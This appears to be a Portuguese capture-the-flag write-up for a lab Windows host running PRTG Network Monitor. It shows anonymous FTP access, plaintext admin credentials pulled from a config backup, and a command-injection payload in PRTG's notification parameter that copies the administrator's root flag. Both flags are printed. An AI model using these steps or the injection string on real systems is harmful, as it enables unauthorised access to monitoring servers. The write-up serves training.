1. Usar nmap para escanear portas e encontrar possíveis fragilidades

```
$ nmap 10.10.10.152

Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-10 10:43 -03
Nmap scan report for 10.10.10.152
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
**21/tcp   open  ftp**
80/tcp   open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

2. A porta 21, do protocolo FTP (para transferência de arquivos), está aberta. Isso significa que podemos conectar como anônimos e começar uma busca pelos diretórios
```
$ lftp Anonymous@10.10.10.152

$lftp> ls                
02-03-19  12:18AM                           1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows

$lftp> cd Users/
$lftp> ls

02-25-19  11:44PM       <DIR>          Administrator
04-11-19  11:27AM       <DIR>          Public

$lftp> cd Public/
$lftp> ls

02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
04-11-19  11:28AM                           90 tester.txt
**02-03-19  12:35AM                           33 user.txt**
07-16-16  09:18AM       <DIR>          Videos
```

3. Apenas andando pelos diretórios conseguimos encontrar a **primeira flag**, no arquivo _user.txt_, que nos concede acesso de usuário

```
$lftp> cat user.txt
**dd58ce67b49e15105e88096c8d9255a5**        
33 bytes transferred
```

4. Continuando a busca, encontramos arquivos de backup (.old e .bak)

```
$lftp> ls -a

11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
04-29-19  09:46AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-25-19  10:56PM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows

$lftp> cd ProgramData/Paessler/PRTG\ Network\ Monitor
$lftp> ls -a

02-03-19  12:40AM       <DIR>          Configuration Auto-Backups
04-29-19  09:47AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
04-29-19  09:47AM       <DIR>          Logs (Web Server)
04-29-19  09:52AM       <DIR>          Monitoring Database
04-29-19  10:00AM              1214224 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
04-29-19  09:48AM              1647616 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
```

5. A análise desses arquivos revela um usuário e uma senha de admin 

```
$lftp> cat PRTG\ Configuration.old.bak
...
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
...
```

6. A porta http (80) aberta mostrada no escaneamento do IP, dá indicios de que teremos um site para analisar. No site, tentamos as credenciais:

**Username: prtgadmin   
Password: PrTg@dmin2018**

E ganhamos acesso negado. Mas vale lembrar que aquilo era um arquivo de backup, então talvez a seja atual tenha mais a ver com o ano atual:

Username: prtgadmin
Password: PrTg@dmin2019

7. Com o login de administrador aceito, vamos tentar executar um programa no servidor a partir da central de notificações do site:

Setup -> Notifications -> Edit Notifications -> Execute Program 

Run command in powershell:
* Demo exe notification - outfile.ps1

No parâmetro, colocaremos um código para copiar o arquivo _root.txt_ do diretório _Administrator_ que não possuimos acesso quando entramos como anônimos no FTP para um diretório no qual possuímos acesso:

* Parameter:
```
flag.txt; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\flag.txt" -Recurse
```
* Execute Notification

8. Voltando ao terminal e nos conectando a partir do FTP, podemos ir até o diretório para onde mandamos o arquivo copiado:
```
$lftp> Users/Public
$lftp> cat flag.txt
**3018977fb944bf1878f75b879fba67cc**
```
E teremos acesso também a **segunda flag**, do arquivo _root.txt_
